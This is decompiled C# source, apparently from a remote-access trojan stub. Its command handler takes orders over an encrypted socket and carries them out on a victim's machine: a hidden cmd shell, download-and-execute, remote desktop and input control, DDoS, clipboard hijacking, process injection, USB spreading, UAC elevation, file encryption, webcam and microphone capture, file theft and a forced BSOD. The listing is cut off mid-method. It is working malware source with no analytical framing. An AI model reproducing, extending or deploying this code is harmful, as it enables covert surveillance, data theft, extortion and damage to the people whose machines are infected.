using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

namespace Stub;

public class Messages
{
	private delegate void AppendOutputTextDelegate(string text);

	private static readonly object SPL = RuntimeHelpers.GetObjectValue(ClientSocket.SPL);

	[AccessedThroughProperty("MyProcess")]
	private static Process _MyProcess;

	private static int processid;

	public static byte[] WCam;

	public static byte[] WMic;

	public static byte[] WSound;

	public static int ngrok;

	public static int RS;

	public static Thread KL;

	public static IntPtr Handle;

	public static int Net3;

	private static Process MyProcess
	{
		get
		{
			return _MyProcess;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DataReceivedEventHandler value2 = MyProcess_OutputDataReceived;
			DataReceivedEventHandler value3 = MyProcess_ErrorDataReceived;
			if (_MyProcess != null)
			{
				_MyProcess.OutputDataReceived -= value2;
				_MyProcess.ErrorDataReceived -= value3;
			}
			_MyProcess = value;
			if (_MyProcess != null)
			{
				_MyProcess.OutputDataReceived += value2;
				_MyProcess.ErrorDataReceived += value3;
			}
		}
	}

	public static void AppendOutputText(string text)
	{
		try
		{
			new AppendOutputTextDelegate(AppendOutputText);
			ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"R/", SPL), (object)text), SPL), (object)Helper.ID())));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void MyProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\nError: " + e.Data + "\r\n");
	}

	private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\n" + e.Data);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Read(byte[] b)
	{
		//IL_1560: Unknown result type (might be due to invalid IL or missing references)
		//IL_1567: Expected O, but got Unknown
		//IL_158a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1599: Expected O, but got Unknown
		//IL_27c2: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(SPL), -1, (CompareMethod)0);
			switch (array[0])
			{
			case "rec":
				Helper.CloseMutex();
				Application.Restart();
				Environment.Exit(0);
				break;
			case "CLOSE":
				ClientSocket.S.Shutdown(SocketShutdown.Both);
				ClientSocket.S.Close();
				Environment.Exit(0);
				break;
			case "uninstall":
			{
				object obj13 = Helper.objj(array[1]);
				object[] array5 = new object[1] { Settings.USBNM };
				object[] array44 = array5;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj13, (Type)null, "un", array44, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.USBNM = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
				}
				break;
			}
			case "update":
			{
				object obj3 = Helper.objj(array[1]);
				object[] array5 = new object[3]
				{
					Settings.USBNM,
					null,
					null
				};
				object[] array13 = array5;
				string[] array10 = array;
				string[] array14 = array10;
				int num2 = 2;
				array13[1] = array14[2];
				object[] array15 = array5;
				string[] array7 = array;
				string[] array16 = array7;
				int num = 3;
				array15[2] = array16[3];
				object[] array2 = array5;
				object[] array17 = array2;
				bool[] array4 = new bool[3] { true, true, true };
				NewLateBinding.LateCall(obj3, (Type)null, "update", array17, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.USBNM = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array10[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				break;
			}
			case "DW":
				Download(array[1], array[2]);
				break;
			case "RD-":
			{
				object obj32 = Screen.get_PrimaryScreen().get_Bounds().Size;
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"RD-", SPL), NewLateBinding.LateGet(obj32, (Type)null, "Width", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), NewLateBinding.LateGet(obj32, (Type)null, "Height", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), (object)Helper.ID())));
				break;
			}
			case "RD+":
			{
				Size size = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				RemoteDesktop.Capture(size, Conversions.ToInteger(array[3]));
				break;
			}
			case "###":
			{
				Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				Cursor.set_Position(position);
				mouse_event(Conversions.ToInteger(array[3]), 0, 0, 0, 1);
				break;
			}
			case "$$$":
			{
				Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				Cursor.set_Position(position);
				break;
			}
			case "^^^&":
			{
				bool flag = Convert.ToBoolean(array[2]);
				byte bVk = Convert.ToByte(array[1]);
				keybd_event(bVk, 0, (!flag) ? 2u : 0u, UIntPtr.Zero);
				break;
			}
			case "FM":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "Memory", new object[1] { RuntimeHelpers.GetObjectValue(Helper.frombase64(array[2])) }, (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "LN":
			{
				string fileName = Path.GetTempFileName() + "-" + array[1];
				WebClient webClient = new WebClient();
				webClient.DownloadFile(array[2], fileName);
				Process.Start(fileName);
				break;
			}
			case "getinfo":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"getinfo", SPL), (object)Helper.ID())));
				break;
			case "Xinfo":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"Xinfo", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), (object)Helper.ID())));
				break;
			case "url":
				Process.Start(array[1]);
				break;
			case "openhide":
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
				object[] array5 = new object[1];
				object[] array19 = array5;
				string[] array7 = array;
				string[] array20 = array7;
				int num = 1;
				array19[0] = array20[1];
				object[] array2 = array5;
				object[] array21 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(objectValue, (Type)null, "navigate", array21, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				NewLateBinding.LateSet(objectValue, (Type)null, "visible", new object[1] { 0 }, (string[])null, (Type[])null);
				break;
			}
			case "shellfuc":
				Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
				break;
			case "regfuc":
			{
				object obj29 = Interaction.CreateObject("WScript.Shell", "");
				object[] array5 = new object[3];
				object[] array88 = array5;
				string[] array7 = array;
				string[] array89 = array7;
				int num = 1;
				array88[0] = array89[1];
				array5[1] = Convert.ToInt32(array[2]);
				array5[2] = "REG_DWORD";
				object[] array2 = array5;
				object[] array90 = array2;
				bool[] array4 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj29, (Type)null, "RegWrite", array90, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "bot":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "RunBotKiller", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "admin":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "uac", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "script":
			{
				object obj26 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array81 = array5;
				string[] array7 = array;
				string[] array82 = array7;
				int num = 2;
				array81[0] = array82[2];
				object[] array83 = array5;
				string[] array10 = array;
				string[] array84 = array10;
				int num2 = 3;
				array83[1] = array84[3];
				object[] array2 = array5;
				object[] array85 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj26, (Type)null, "exc", array85, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array10[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "DDosS":
				try
				{
					Helper.DDos.Abort();
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				Helper.DDos = new Thread((ThreadStart)delegate
				{
					Helper.STDos();
				});
				Helper.IPHOST = Helper.IsValid(array[1]);
				Helper.PortHost = array[2];
				Helper.DDos.Start();
				break;
			case "DDosT":
				try
				{
					Helper.DDos.Abort();
					break;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					break;
				}
			case "Cilpper":
			{
				object obj10 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array33 = array5;
				string[] array7 = array;
				string[] array34 = array7;
				int num = 2;
				array33[0] = array34[2];
				object[] array35 = array5;
				string[] array10 = array;
				string[] array36 = array10;
				int num2 = 3;
				array35[1] = array36[3];
				object[] array2 = array5;
				object[] array37 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj10, (Type)null, "Clipper", array37, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array10[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "PE":
				if (File.Exists(array[2]))
				{
					object obj9 = Helper.objj(array[1]);
					object[] array5 = new object[2];
					object[] array30 = array5;
					string[] array7 = array;
					string[] array31 = array7;
					int num = 2;
					array30[0] = array31[2];
					array5[1] = RuntimeHelpers.GetObjectValue(Helper.frombase64(array[3]));
					object[] array2 = array5;
					object[] array32 = array2;
					bool[] array4 = new bool[2] { true, false };
					NewLateBinding.LateCall(obj9, (Type)null, "injRun", array32, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
				}
				break;
			case "startusb":
				if (!Settings.usbC)
				{
					object obj5 = Helper.objj(array[1]);
					object[] array2 = new object[1] { Settings.USBNM };
					object[] array22 = array2;
					bool[] array4 = new bool[1] { true };
					NewLateBinding.LateCall(obj5, (Type)null, "startsp", array22, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						Settings.USBNM = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					Settings.usbC = true;
				}
				break;
			case "vbb":
			{
				object obj2 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array6 = array5;
				string[] array7 = array;
				string[] array8 = array7;
				int num = 2;
				array6[0] = array8[2];
				object[] array9 = array5;
				string[] array10 = array;
				string[] array11 = array10;
				int num2 = 3;
				array9[1] = array11[3];
				object[] array2 = array5;
				object[] array12 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj2, (Type)null, "CallV", array12, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array10[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "PSleep":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "PreventSleep", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "xxx":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"xxx", SPL), (object)Helper.ID())));
				break;
			case "R/":
				try
				{
					try
					{
						using Process process2 = new Process();
						process2.StartInfo.FileName = "taskkill.exe";
						process2.StartInfo.Arguments = " /pid " + Conversions.ToString(processid) + " /f";
						process2.StartInfo.UseShellExecute = false;
						process2.StartInfo.RedirectStandardError = false;
						process2.StartInfo.RedirectStandardOutput = false;
						process2.StartInfo.CreateNoWindow = true;
						process2.Start();
						process2.WaitForExit();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					MyProcess = new Process();
					ProcessStartInfo startInfo = MyProcess.StartInfo;
					startInfo.FileName = "CMD.EXE";
					startInfo.UseShellExecute = false;
					startInfo.CreateNoWindow = true;
					startInfo.RedirectStandardInput = true;
					startInfo.RedirectStandardOutput = true;
					startInfo.RedirectStandardError = true;
					startInfo = null;
					MyProcess.Start();
					processid = MyProcess.Id;
					MyProcess.BeginErrorReadLine();
					MyProcess.BeginOutputReadLine();
					AppendOutputText("Process Started at: " + MyProcess.StartTime);
					break;
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
					break;
				}
			case "runnnnnn":
				MyProcess.StandardInput.WriteLine(array[1]);
				MyProcess.StandardInput.Flush();
				break;
			case "closeshell":
				MyProcess.StandardInput.WriteLine("EXIT");
				MyProcess.StandardInput.Flush();
				MyProcess.Close();
				break;
			case "ppp":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ppp", SPL), (object)Helper.ID())));
				break;
			case "R#":
			{
				string text6 = null;
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						text6 = text6 + Path.GetFileNameWithoutExtension(process.ProcessName) + Path.GetExtension(process.MainModule!.FileName!.ToString()) + "|+++|" + Conversions.ToString(process.Id) + "|+++|" + process.MainModule!.FileName!.ToString() + "*+*";
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
				}
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R#", SPL), (object)text6), SPL), Operators.AddObject(Operators.AddObject((object)Settings.current, SPL), (object)Helper.ID()))));
				break;
			}
			case "kill":
				Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
				break;
			case "kD":
				Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
				Thread.Sleep(500);
				File.Delete(array[2]);
				break;
			case "RST":
				Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
				Thread.Sleep(500);
				Process.Start(array[2]);
				break;
			case "cbb":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"cbb", SPL), (object)Helper.ID())));
				break;
			case "R$":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R$", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "GetText", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), (object)Helper.ID())));
				break;
			case "SETT":
			{
				object obj30 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array91 = array5;
				string[] array7 = array;
				string[] array92 = array7;
				int num = 2;
				array91[0] = array92[2];
				object[] array2 = array5;
				object[] array93 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj30, (Type)null, "setText", array93, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "clss":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "clearr", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "BSOD":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "BSOD", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "BScreen":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "Blank", new object[1] { Convert.ToInt32(array[2]) }, (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "InsW":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "INSS", new object[1] { Convert.ToInt32(array[2]) }, (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "|||":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"|||", SPL), (object)Helper.ID())));
				break;
			case "GetDrives":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)Helper.ID()), SPL), (object)getDrives())));
				break;
			case "FileManager":
				try
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)Helper.ID()), SPL), (object)getFolders(array[1])), (object)getFiles(array[1]))));
					break;
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)Helper.ID()), SPL), (object)"Error")));
					ProjectData.ClearProjectError();
					break;
				}
			case "Delete":
			{
				string text5 = array[1];
				if (Operators.CompareString(text5, "Folder", false) == 0)
				{
					Directory.Delete(array[2], recursive: true);
				}
				else if (Operators.CompareString(text5, "File", false) == 0)
				{
					File.Delete(array[2]);
				}
				break;
			}
			case "Execute":
				Process.Start(array[1]);
				break;
			case "Rename":
			{
				string text3 = array[1];
				if (Operators.CompareString(text3, "Folder", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(array[2], array[3]);
				}
				else if (Operators.CompareString(text3, "File", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(array[2], array[3]);
				}
				break;
			}
			case "tss":
			{
				string text4 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(array[1]);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"txtttt", SPL), Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Helper.ID(), SPL), (object)text4), SPL), (object)array[1]))));
				break;
			}
			case "sedit":
			{
				StreamWriter streamWriter = new StreamWriter(array[1], append: false);
				streamWriter.WriteLine(array[2]);
				streamWriter.Close();
				break;
			}
			case "viewimage":
			{
				using MemoryStream memoryStream = new MemoryStream();
				Bitmap val = new Bitmap(array[1]);
				try
				{
					((Image)val).GetThumbnailImage(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]), (GetThumbnailImageAbort)(() => false), IntPtr.Zero).Save((Stream)memoryStream, ImageFormat.get_Png());
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"viewimage", SPL), (object)Helper.ID()), ClientSocket.SPL), (object)Helper.BS(memoryStream.ToArray()))));
				break;
			}
			case "hidefolderfile":
				FileSystem.SetAttr(array[1], (FileAttribute)2);
				break;
			case "showfolderfile":
				FileSystem.SetAttr(array[1], (FileAttribute)0);
				break;
			case "creatnewfolder":
				((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(array[1]);
				break;
			case "creatfile":
				File.Create(array[1]).Dispose();
				break;
			case "downloadfile":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"downloadedfile", SPL), (object)Convert.ToBase64String(File.ReadAllBytes(array[1]))), SPL), (object)array[2]), SPL), (object)Helper.ID())));
				break;
			case "sendfileto":
				File.WriteAllBytes(array[1], (byte[])Helper.frombase64(array[2]));
				break;
			case "WL":
			{
				object obj20 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array71 = array5;
				string[] array7 = array;
				string[] array72 = array7;
				int num = 2;
				array71[0] = array72[2];
				object[] array2 = array5;
				object[] array73 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj20, (Type)null, "WL", array73, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "DelP":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "del", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "7zIT":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "NETINS":
				if (Net3 != 1)
				{
					Net3 = 1;
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				break;
			case "7zzip":
				Interaction.Shell(Path.GetTempPath() + "7zip\\7z.exe" + array[1], (AppWinStyle)0, false, -1);
				break;
			case "CPP":
			{
				string[] array63 = Strings.Split(array[1], "|", -1, (CompareMethod)0);
				foreach (object obj18 in array63)
				{
					try
					{
						if (File.Exists(Conversions.ToString(obj18)))
						{
							File.Copy(Conversions.ToString(obj18), array[2] + Path.GetFileName(Conversions.ToString(obj18)));
						}
						if (Directory.Exists(Conversions.ToString(obj18)))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CopyDirectory(Conversions.ToString(obj18), array[2] + Path.GetFileName(Conversions.ToString(obj18)), true);
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
				break;
			}
			case "CTT":
			{
				string[] array62 = Strings.Split(array[1], "|", -1, (CompareMethod)0);
				foreach (object obj17 in array62)
				{
					try
					{
						if (File.Exists(Conversions.ToString(obj17)))
						{
							File.Move(Conversions.ToString(obj17), array[2] + Path.GetFileName(Conversions.ToString(obj17)));
						}
						if (Directory.Exists(Conversions.ToString(obj17)))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().MoveDirectory(Conversions.ToString(obj17), array[2] + Path.GetFileName(Conversions.ToString(obj17)), true);
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				break;
			}
			case "PRG":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"PRG", SPL), (object)Helper.ID())));
				break;
			case "P@":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"P@", SPL), Operators.AddObject(Operators.AddObject(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "InsProg", new object[0], (string[])null, (Type[])null, (bool[])null), SPL), (object)Helper.ID()))));
				break;
			case "UNS":
				Interaction.Shell(array[1], (AppWinStyle)1, false, -1);
				break;
			case "RSS":
				((Computer)MyProject.Computer).get_Audio().Stop();
				((Computer)MyProject.Computer).get_Audio().Play(array[1]);
				break;
			case "RSSDis":
				((Computer)MyProject.Computer).get_Audio().Stop();
				break;
			case "ENC":
			{
				object obj14 = Helper.objj(array[1]);
				object[] array5 = new object[2]
				{
					Helper.ID(),
					null
				};
				object[] array45 = array5;
				string[] array7 = array;
				string[] array46 = array7;
				int num = 2;
				array45[1] = array46[2];
				object[] array2 = array5;
				object[] array47 = array2;
				bool[] array4 = new bool[2] { false, true };
				NewLateBinding.LateCall(obj14, (Type)null, "ENC", array47, (string[])null, (Type[])null, array4, true);
				if (array4[1])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "DEC":
			{
				object obj11 = Helper.objj(array[1]);
				object[] array5 = new object[2]
				{
					Helper.ID(),
					null
				};
				object[] array38 = array5;
				string[] array7 = array;
				string[] array39 = array7;
				int num = 2;
				array38[1] = array39[2];
				object[] array2 = array5;
				object[] array40 = array2;
				bool[] array4 = new bool[2] { false, true };
				NewLateBinding.LateCall(obj11, (Type)null, "DEC", array40, (string[])null, (Type[])null, array4, true);
				if (array4[1])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "WBCM":
			{
				if (!Cam())
				{
					break;
				}
				try
				{
					WCam = (byte[])Helper.frombase64(array[1]);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				if (WCam == null)
				{
					ClientSocket.Send("GETWCamPlu");
					break;
				}
				object obj4 = Helper.objj(Convert.ToBase64String(WCam));
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array18 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj4, (Type)null, "CON", array18, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "MICL":
			{
				try
				{
					WMic = (byte[])Helper.frombase64(array[1]);
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				if (WMic == null)
				{
					ClientSocket.Send("GETWmicPlu");
					break;
				}
				object obj31 = Helper.objj(Convert.ToBase64String(WMic));
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array94 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj31, (Type)null, "CON", array94, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "Wsound":
			{
				try
				{
					WSound = (byte[])Helper.frombase64(array[1]);
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
				if (WSound == null)
				{
					ClientSocket.Send("GETWsoundPlu");
					break;
				}
				object obj28 = Helper.objj(Convert.ToBase64String(WSound));
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array87 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj28, (Type)null, "CON", array87, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "JustFun":
			{
				object obj27 = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array86 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj27, (Type)null, "CON", array86, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "MapsPLU":
			{
				object obj25 = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
